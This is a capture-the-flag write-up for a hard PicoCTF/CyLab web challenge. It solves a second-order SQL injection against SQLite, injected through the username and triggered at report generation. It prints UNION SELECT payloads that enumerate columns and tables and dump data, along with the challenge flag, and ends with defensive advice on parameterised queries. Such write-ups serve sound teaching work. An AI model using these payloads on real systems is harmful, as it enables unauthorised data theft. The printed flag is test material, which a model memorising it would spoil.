# ORDER ORDER 

- **Platform:** CyLab academy(PicoCTF)
- **Category:** Web
- **Difficulty:** Hard

## Challenge

Can you try to get the flag from our website. I've prepared my queries everywhere! I think!

## Solution

1. After accessing the website, we were asked to register an account. After registering and logging in, we can see 3 pages, Dashborad, Expenses and Inbox. I first tried to put the SQL injection payload in the added expense but that was met with little success. Then I tried to generate the report and see if any injection entries are avaliable there but still nothing. 

2. After some more trying, I found that when I registed my name as `'` it will generate an error when generating the report.
```
Report generation failed. Cause unrecognized token: "'''"
```
This error code suggests that the DBMS is possibly SQLite. 

3. Since now we have the target DBMS and injection enrty, we can confirm the number of fields returned using the following payload:
```
' ORDER BY 4--
```
and we can get the error:
```
Report generation failed. Cause 1st ORDER BY term out of range - should be between 1 and 3
```
So this suggests that our request should have 3 fields. 
4. Now we need to find out the names of the tables for further injection. Since we already know the DBMS is SQLite, we can construct the following payload:
```
' UNION SELECT name, NULL,NULL FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite_%';--
```
And we can get our response in the report generated. 

5. In our response, we can see a particularly interesting one called `aDNyM19uMF9mMTRn`, using the payload:
```
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name = 'aDNyM19uMF9mMTRn' --
```
we can get the name of the fields in this table, they are called `name` and `value`.
6. We just need to make a query to show everything in `aDNyM19uMF9mMTRn` with this payload:
```
' UNION SELECT value,name,NULL FROM aDNyM19uMF9mMTRn; --
```
and we can see our flag in the report.
## Flag

`academy{s3c0nd_0rd3r_1t_1s_ef821ef7}`

## Key Takeaway

SQL injection occurs when untrusted user input is incorporated into SQL queries in a way that allows the input to alter the query's structure or behaviour.

The primary defence is to use parameterised queries (prepared statements), which separate SQL instructions from user-supplied data. For dynamic SQL elements that cannot be parameterised, such as table names or sort directions, strict allowlists should be used. Input validation provides an additional layer of defence but should not replace parameterisation.

## References

- [https://learn.cylabacademy.org/library/752]
